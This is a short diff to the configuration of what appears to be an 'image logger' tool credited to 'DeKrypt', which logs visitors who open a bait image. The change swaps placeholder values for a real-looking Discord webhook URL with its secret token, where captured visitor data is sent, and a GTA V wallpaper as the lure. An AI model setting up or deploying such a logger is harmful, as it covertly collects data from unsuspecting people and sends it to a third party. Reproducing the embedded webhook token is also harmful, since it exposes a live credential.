@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1334918497821659228/mfZY0CU32CObtVAj3wq-PVQKtc8aWcixWHEbwiYgZQ07TpU3hSvepmM2OtiY8Fs-Ed7v",
+    "image": "https://img.goodfon.com/wallpaper/big/0/ee/grand-theft-auto-v-gta-5-game-city-sky.webp", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
